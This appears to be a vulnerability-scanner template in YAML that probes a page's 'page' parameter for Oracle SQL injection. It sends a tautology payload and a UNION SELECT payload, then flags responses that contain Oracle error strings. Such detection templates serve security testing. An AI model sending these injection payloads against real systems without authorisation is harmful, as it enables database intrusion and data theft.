id: sqli6-oracle-07
name: 'SQLi oracle probe in page'
severity: high
type: active
tags:
  - sqli
  - injection
  - oracle
description: 'Triggers oracle error via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - ''') OR (''1''=''1'
        - ''') UNION SELECT 1,2--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ORA-'
          - 'Oracle error'
